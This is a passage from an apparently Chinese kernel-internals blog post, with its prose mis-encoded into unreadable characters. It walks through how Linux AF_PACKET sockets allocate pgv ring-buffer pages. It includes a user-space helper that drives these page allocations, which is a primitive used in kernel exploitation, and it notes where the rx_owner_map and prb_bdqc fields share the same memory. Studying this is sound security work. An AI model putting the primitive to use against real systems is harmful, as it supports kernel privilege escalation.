class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ¥éªŒè¯è¿™ä¸ªå¤§å°ï¼Œç¯å½¢ç¼“å†²åŒºçš„åˆ›å»ºé€šè¿‡ <code>packet_set_ring()</code> å®Œæˆï¼Œæ ¹æ® Packet Socket ç‰ˆæœ¬çš„ä¸åŒåœ¨æ“ä½œä¸Šä¼šå­˜åœ¨ä¸€äº›ç»†å¾®çš„å·®åˆ«ï¼Œä¸€äº›ç§æœ‰æ•°æ®ä¼šè¢«å­˜æ”¾åœ¨ <code>packet_socket</code> è¿™ä¸€ç»“æ„ä½“å½“ä¸­ï¼Œä»¥åŠå¯¹äº TX ring å’Œ RX ringè€Œè¨€åœ¨å…¶ä¸­ä½¿ç”¨äº†ä¸¤ä¸ªä¸åŒçš„ <code>packet_ring_buffer</code> ç»“æ„ä½“å­˜æ”¾æ•°æ®ï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">packet_set_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">union</span> tpacket_req_u *req_u,</span><br><span class="hljs-params"><span class="hljs-type">int</span> closing, <span class="hljs-type">int</span> tx_ring)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> *<span class="hljs-title">po</span> =</span> pkt_sk(sk);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *rx_owner_map = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> was_running, order = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span> *<span class="hljs-title">rb</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sk_buff_head</span> *<span class="hljs-title">rb_queue</span>;</span><br>__be16 num;<br><span class="hljs-type">int</span> err;<br><span class="hljs-comment">/* Added to avoid minimal code churn */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> *<span class="hljs-title">req</span> =</span> &amp;req_u-&gt;req;<br><br>rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;<br>rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;<br><br>err = -EBUSY;<br><span class="hljs-keyword">if</span> (!closing) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;po-&gt;mapped))<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">if</span> (packet_read_pending(rb))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºå—æ•°é‡ä¸ä¸º 0 çš„æƒ…å†µï¼Œé¦–å…ˆä¼šè¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (req-&gt;tp_block_nr) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> min_frame_size;<br><br><span class="hljs-comment">/* Sanity tests and some calculations */</span><br>err = -EBUSY;<br><span class="hljs-keyword">if</span> (unlikely(rb-&gt;pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">switch</span> (po-&gt;tp_version) &#123;<br><span class="hljs-keyword">case</span> TPACKET_V1:<br>po-&gt;tp_hdrlen = TPACKET_HDRLEN;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> TPACKET_V2:<br>po-&gt;tp_hdrlen = TPACKET2_HDRLEN;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> TPACKET_V3:<br>po-&gt;tp_hdrlen = TPACKET3_HDRLEN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>err = -EINVAL;<br><span class="hljs-keyword">if</span> (unlikely((<span class="hljs-type">int</span>)req-&gt;tp_block_size &lt;= <span class="hljs-number">0</span>))<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">if</span> (unlikely(!PAGE_ALIGNED(req-&gt;tp_block_size)))<br><span class="hljs-keyword">goto</span> out;<br>min_frame_size = po-&gt;tp_hdrlen + po-&gt;tp_reserve;<br><span class="hljs-keyword">if</span> (po-&gt;tp_version &gt;= TPACKET_V3 &amp;&amp;<br>    req-&gt;tp_block_size &lt;<br>    BLK_PLUS_PRIV((u64)req_u-&gt;req3.tp_sizeof_priv) + min_frame_size)<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">if</span> (unlikely(req-&gt;tp_frame_size &lt; min_frame_size))<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">if</span> (unlikely(req-&gt;tp_frame_size &amp; (TPACKET_ALIGNMENT - <span class="hljs-number">1</span>)))<br><span class="hljs-keyword">goto</span> out;<br><br>rb-&gt;frames_per_block = req-&gt;tp_block_size / req-&gt;tp_frame_size;<br><span class="hljs-keyword">if</span> (unlikely(rb-&gt;frames_per_block == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">if</span> (unlikely(rb-&gt;frames_per_block &gt; UINT_MAX / req-&gt;tp_block_nr))<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">if</span> (unlikely((rb-&gt;frames_per_block * req-&gt;tp_block_nr) !=<br>req-&gt;tp_frame_nr))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p>ä¹‹ååˆ†é… <code>pgv</code> ç»“æ„ä½“ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯ <code>alloc_pg_vec()</code> å‡½æ•°è¿›è¡Œåˆ†é…ï¼Œé¦–å…ˆåˆ†é…æˆå‘˜æ•°é‡ä¸º <code>tp_block_nr</code> çš„ <code>pgv</code> ç»“æ„ä½“æ•°ç»„ï¼Œæ¥ä¸‹æ¥è¿›è¡Œ <code>tp_block_nr</code> æ¬¡çš„ä¸ºæ¯ä¸ªæ•°ç»„æˆå‘˜è°ƒç”¨é¡µçº§å†…å­˜åˆ†é… API ä» buddy allocator åˆ†é…å†…å­˜ï¼ˆå¤±è´¥åˆ™è°ƒç”¨ vzalloc() åˆ†é…ï¼‰ï¼Œå°† page åœ¨ direct mapped area ä¸Šå¯¹åº”çš„åœ°å€å­˜æ”¾åˆ° <code>pgv</code> ç»“æ„ä½“å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><br><span class="hljs-comment">/* __get_free_pages failed, fall back to vmalloc */</span><br>buffer = vzalloc(array_size((<span class="hljs-number">1</span> &lt;&lt; order), PAGE_SIZE));<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><br><span class="hljs-comment">/* vmalloc failed, lets dig into swap here */</span><br>gfp_flags &amp;= ~__GFP_NORETRY;<br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><br><span class="hljs-comment">/* complete and utter failure */</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br><span class="hljs-type">int</span> i;<br><br>pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br><span class="hljs-keyword">goto</span> out_free_pgvec;<br>&#125;<br><br>out:<br><span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>free_pg_vec(pg_vec, order, block_nr);<br>pg_vec = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">packet_set_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">union</span> tpacket_req_u *req_u,</span><br><span class="hljs-params"><span class="hljs-type">int</span> closing, <span class="hljs-type">int</span> tx_ring)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (req-&gt;tp_block_nr) &#123;<br><span class="hljs-comment">//...</span><br>err = -ENOMEM;<br>order = get_order(req-&gt;tp_block_size);<br>pg_vec = alloc_pg_vec(req, order);<br></code></pre></td></tr></table></figure><p>ä¸éš¾å¾—åˆ° <code>pgv</code> ç»“æ„ä½“é•¿è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2025/05/02/5axPboIU4TD9EMG.png"></p><p>ä¹‹åæ ¹æ® packet version ä»¥åŠ ring çš„ç±»åˆ«ï¼ˆ <code>TX</code> æˆ– <code>RX</code> ï¼‰è¿›è¡Œä¸åŒå¤„ç†ï¼š</p><ul><li>å¯¹äº <code>TPACKET_V3</code> è€Œè¨€ï¼Œå¦‚æœä¸æ˜¯ <code>tx_ring</code> ï¼Œåˆ™è°ƒç”¨ <code>init_prb_bdqc()</code> è¿›è¡Œåˆå§‹åŒ–</li><li>å¯¹äºå…¶ä»– versionï¼Œå¦‚æœä¸æ˜¯ <code>tx_ring</code> ï¼Œåˆ™è°ƒç”¨ <code>bitmap_alloc()</code> åˆ†é…ä¸€ä¸ªä½å›¾</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><span class="hljs-keyword">switch</span> (po-&gt;tp_version) &#123;<br><span class="hljs-keyword">case</span> TPACKET_V3:<br><span class="hljs-comment">/* Block transmit is not supported yet */</span><br><span class="hljs-keyword">if</span> (!tx_ring) &#123;<br>init_prb_bdqc(po, rb, pg_vec, req_u);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">struct</span> tpacket_req3 *req3 = &amp;req_u-&gt;req3;<br><br><span class="hljs-keyword">if</span> (req3-&gt;tp_retire_blk_tov ||<br>    req3-&gt;tp_sizeof_priv ||<br>    req3-&gt;tp_feature_req_word) &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">goto</span> out_free_pg_vec;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span> (!tx_ring) &#123;<br>rx_owner_map = bitmap_alloc(req-&gt;tp_frame_nr,<br>GFP_KERNEL | __GFP_NOWARN | __GFP_ZERO);<br><span class="hljs-keyword">if</span> (!rx_owner_map)<br><span class="hljs-keyword">goto</span> out_free_pg_vec;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœ <code>tp_block_nr</code> æ˜¯ 0 è€Œ <code>tp_frame_nr</code> é 0 çš„è¯åˆ™ç›´æ¥è·³åˆ°å‡ºå£è¿”å›ï¼Œå¦åˆ™ä»ä¼šç»§ç»­èµ°ä¸‹é¢çš„è·¯å¾„ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Done */</span><br><span class="hljs-keyword">else</span> &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">if</span> (unlikely(req-&gt;tp_frame_nr))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆå¯¹ <code>pgv</code> çš„åˆ†é…ä¹‹åï¼Œæ¥ä¸‹æ¥å­˜æ”¾åˆ° socket ç»“æ„ä½“å†…éƒ¨ï¼Œæ›¿æ¢æ‰æ—§çš„ <code>pgv</code> ï¼Œå¦‚æœæ˜¯ V2 åŠä¹‹å‰çš„ç‰ˆæœ¬è¿˜è¦æ›¿æ¢æ‰æ—§çš„ <code>rx_owner_map</code> ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ° <strong>å½“ tp_block_nr å’Œ tp_frame_nr éƒ½æ˜¯ 0 çš„æƒ…å†µä¸‹åˆ™ä¸ä¼šè¿›è¡Œåˆ†é…ï¼Œè€Œæ˜¯ä¼šè¿›è¡Œæ¸…ç†çš„å·¥ä½œ</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Detach socket from network */</span><br>spin_lock(&amp;po-&gt;bind_lock);<br>was_running = po-&gt;running;<br>num = po-&gt;num;<br><span class="hljs-keyword">if</span> (was_running) &#123;<br>po-&gt;num = <span class="hljs-number">0</span>;<br>__unregister_prot_hook(sk, <span class="hljs-literal">false</span>);<br>&#125;<br>spin_unlock(&amp;po-&gt;bind_lock);<br><br>synchronize_net();<br><br>err = -EBUSY;<br>mutex_lock(&amp;po-&gt;pg_vec_lock);<br><span class="hljs-keyword">if</span> (closing || <span class="hljs-type">atomic_read</span>(&amp;po-&gt;mapped) == <span class="hljs-number">0</span>) &#123;<br>err = <span class="hljs-number">0</span>;<br>spin_lock_bh(&amp;rb_queue-&gt;lock);<br>swap(rb-&gt;pg_vec, pg_vec);<br><span class="hljs-keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)<br>swap(rb-&gt;rx_owner_map, rx_owner_map);<br>rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="hljs-number">1</span>);<br>rb-&gt;head = <span class="hljs-number">0</span>;<br>rb-&gt;frame_size = req-&gt;tp_frame_size;<br>spin_unlock_bh(&amp;rb_queue-&gt;lock);<br><br>swap(rb-&gt;pg_vec_order, order);<br>swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);<br><br>rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;<br>po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?<br>tpacket_rcv : packet_rcv;<br>skb_queue_purge(rb_queue);<br><span class="hljs-keyword">if</span> (<span class="hljs-type">atomic_read</span>(&amp;po-&gt;mapped))<br>pr_err(<span class="hljs-string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,<br>       <span class="hljs-type">atomic_read</span>(&amp;po-&gt;mapped));<br>&#125;<br>mutex_unlock(&amp;po-&gt;pg_vec_lock);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¼šæ³¨æ„åˆ°æœ‰å­˜åœ¨ä¸€ä¸ªå­—æ®µå¤ç”¨çš„æƒ…å†µï¼Œå¯¹äº V1 å’Œ V2 è€Œè¨€ä¼šä½¿ç”¨ <code>packet_ring_buffer::rx_owner_map</code> å­˜æ”¾ <code>rx_owner_map</code> ï¼Œå¯¹äº V3 è€Œè¨€ä¼šåœ¨  <code>init_prb_bdqc()</code> ä¸­é¢å¤–ä½¿ç”¨ <code>packet_ring_buffer::prb_bdqc::pkbdq</code> å­˜æ”¾ <code>pgv</code> ï¼Œè¿™ä¸¤ä¸ªå­—æ®µåœ¨ç»“æ„ä½“ä¸­çš„ç‰©ç†ä½ç½®ç›¸åŒï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span>*<span class="hljs-title">pkbdq</span>;</span><br><span class="hljs-comment">//...</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span>*<span class="hljs-title">pg_vec</span>;</span><br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*rx_owner_map;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span><span class="hljs-title">prb_bdqc</span>;</span><br>&#125;;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init_prb_bdqc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> packet_sock *po,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> packet_ring_buffer *rb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> pgv *pg_vec,</span><br><span class="hljs-params"><span class="hljs-keyword">union</span> tpacket_req_u *req_u)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span> *<span class="hljs-title">p1</span> =</span> GET_PBDQC_FROM_RB(rb);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_block_desc</span> *<span class="hljs-title">pbd</span>;</span><br><br><span class="hljs-built_in">memset</span>(p1, <span class="hljs-number">0x0</span>, <span class="hljs-keyword">sizeof</span>(*p1));<br><br>p1-&gt;knxt_seq_num = <span class="hljs-number">1</span>;<br>p1-&gt;pkbdq = pg_vec;<br></code></pre></td></tr></table></figure><p>å›åˆ°  <code>packet_set_ring()</code> ï¼Œæœ€åå°±æ˜¯æ”¶å°¾å·¥ä½œï¼Œå°†æ›¿æ¢å‡ºæ¥çš„æ—§çš„ <code>pgv</code> å’Œ <code>rx_owner_map</code> è¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">spin_lock(&amp;po-&gt;bind_lock);<br><span class="hljs-keyword">if</span> (was_running) &#123;<br>po-&gt;num = num;<br>register_prot_hook(sk);<br>&#125;<br>spin_unlock(&amp;po-&gt;bind_lock);<br><span class="hljs-keyword">if</span> (pg_vec &amp;&amp; (po-&gt;tp_version &gt; TPACKET_V2)) &#123;<br><span class="hljs-comment">/* Because we don&#x27;t support block-based V3 on tx-ring */</span><br><span class="hljs-keyword">if</span> (!tx_ring)<br>prb_shutdown_retire_blk_timer(po, rb_queue);<br>&#125;<br><br>out_free_pg_vec:<br>bitmap_free(rx_owner_map);<br><span class="hljs-keyword">if</span> (pg_vec)<br>free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);<br>out:<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mmap-for-Packet-Socket"><a href="#mmap-for-Packet-Socket" class="headerlink" title="mmap for Packet Socket"></a>mmap for Packet Socket</h2><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹å¦‚ä½•åœ¨ç”¨æˆ·æ€ä½¿ç”¨ <code>pgv</code> ç¼“å†²åŒºè¿›è¡Œæ•°æ®äº¤æ¢ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡ <code>setsockopt()</code> åˆ›å»ºå¹¶åˆ†é… <code>pgv</code> ç¼“å†²åŒºä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>mmap()</code> å°†ç¼“å†²åŒºæ˜ å°„åˆ°ç”¨æˆ·æ€ï¼Œåœ¨æˆ‘ä»¬åˆ›å»º mmap åŒºåŸŸæ—¶å†…æ ¸ä¾¿ä¼šç›´æ¥å»ºç«‹ <code>pgv</code> ç¼“å†²åŒºåœ¨ç”¨æˆ·ç©ºé—´çš„æ˜ 